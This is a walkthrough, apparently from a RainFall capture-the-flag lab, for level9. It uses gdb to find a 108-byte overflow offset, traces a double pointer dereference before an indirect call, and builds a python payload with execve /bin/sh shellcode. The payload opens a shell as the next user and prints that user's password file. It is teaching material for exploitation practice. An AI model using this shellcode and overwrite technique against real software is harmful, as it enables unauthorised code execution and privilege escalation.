@@ -1,0 +1,133 @@
+This piece of disassembled code shows that whatever written at %edx will be called so we instantly assume that our goal is to write shellcode to edx
+
+   0x08048693 <+159>:   call   *%edx
+
+Let's explore what happens at this breakpoints 
+   0x0804867c <+136>:   mov    0x10(%esp),%eax
+   0x08048680 <+140>:   mov    (%eax),%eax
+   0x08048682 <+142>:   mov    (%eax),%edx
+
+To do that we will pass to programm paylod that has offset length, but let's find it first with the help of https://wiremask.eu/tools/buffer-overflow-pattern-generator/?
+
+(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+Starting program: /home/user/level9/level9 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+
+Program received signal SIGSEGV, Segmentation fault.
+0x08048682 in main ()
+(gdb) i r
+eax            0x41366441       1094083649
+ecx            0x67413567       1732326759
+edx            0x804a0d4        134521044
+ebx            0x804a078        134520952
+esp            0xbffff650       0xbffff650
+ebp            0xbffff678       0xbffff678
+esi            0x0      0
+edi            0x0      0
+eip            0x8048682        0x8048682 <main+142>
+eflags         0x210287 [ CF PF SF IF RF ID ]
+cs             0x73     115
+ss             0x7b     123
+ds             0x7b     123
+es             0x7b     123
+fs             0x0      0
+gs             0x33     51
+
+0x41366441 = offset 108
+
+We will also define hook-stop
+(gdb) defin hook-stop
+Type commands for definition of "hook-stop".
+End with a line saying just "end".
+>i r
+>end
+
+(gdb) ni
+eax            0x804a00c        134520844
+ecx            0x35644134       895762740
+edx            0x804a078        134520952
+ebx            0x804a078        134520952
+esp            0xbffff6a0       0xbffff6a0
+ebp            0xbffff6c8       0xbffff6c8
+esi            0x0      0
+edi            0x0      0
+eip            0x804867c        0x804867c <main+136>
+eflags         0x200287 [ CF PF SF IF ID ]
+cs             0x73     115
+ss             0x7b     123
+ds             0x7b     123
+es             0x7b     123
+fs             0x0      0
+gs             0x33     51
+0x0804867c in main ()
+
+edx = 0x804a078 = 0x804a00c + 0x6c = eax + 0x6c
+108 = 0x6c
+
+(gdb) x/20wx $eax
+0x804a00c:      0x41306141      0x61413161      0x33614132      0x41346141
+0x804a01c:      0x61413561      0x37614136      0x41386141      0x62413961
+0x804a02c:      0x31624130      0x41326241      0x62413362      0x35624134
+0x804a03c:      0x41366241      0x62413762      0x39624138      0x41306341
+0x804a04c:      0x63413163      0x33634132      0x41346341      0x63413563
+
+We also see that $eax stores the payload we send to program. 0x41306141 means that at 0x804a00c offset equals to 0, thus 0x804a00c - beginning of string
+
+(gdb) x/10x $esp + 0x10
+0xbffff6b0:     0x0804a078      0x0804a008      0x0804a078      0x0804a008
+0xbffff6c0:     0x08048770      0xb7eebff4      0x00000000      0xb7d604d3
+0xbffff6d0:     0x00000002      0xbffff764
+
+instruction mov    0x10(%esp),%eax will write  0x0804a078 to eax
+
+(gdb) ni
+eax            0x804a078        134520952
+ecx            0x35644134       895762740
+edx            0x804a078        134520952
+ebx            0x804a078        134520952
+...
+0x08048680 in main ()
+
+(gdb) x/wx 0x804a078
+0x804a078:      0x08048848
+
+Content of eax  (0x08048848) will be written to it
+
+gdb) ni
+eax            0x8048848        134514760
+ecx            0x35644134       895762740
+edx            0x804a078        134520952
+ebx            0x804a078        134520952
+...
+0x08048682 in main ()
+(gdb) x/wx 0x8048848
+0x8048848 <_ZTV1N+8>:   0x0804873a
+
+Content of eax (0x0804873a) will be written in edx
+(gdb) ni
+eax            0x8048848        134514760
+ecx            0x35644134       895762740
+edx            0x804873a        134514490
+ebx            0x804a078        134520952
+...
+0x08048684 in main ()
+
+and then call *%edx will execute instructions in edx
+
+So 0x804a078 will have address 1 in in it
+address 1 will have address 2 of shellcode
+
+At the end of the input string we will write address that points to the begining (0x804a00c), and at the begining - address of next 4 bytes of string (0x804a00c + 0x4)
+
+[address 1 -> begining of shellcode] + [shelcode] + [smth ramdom] + [address 2 -> address 1  ]
+
+
+level9@RainFall:~$ ./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\x90" * (108 - 21 - 4)  + "\x0c\xa0\x04\x08"')
+$ whoami
+bonus0
+$ cat /home/user/bonus0/.pass
+f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
+
+level9@RainFall:~$ su bonus0
+Password: 
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/bonus0/bonus0
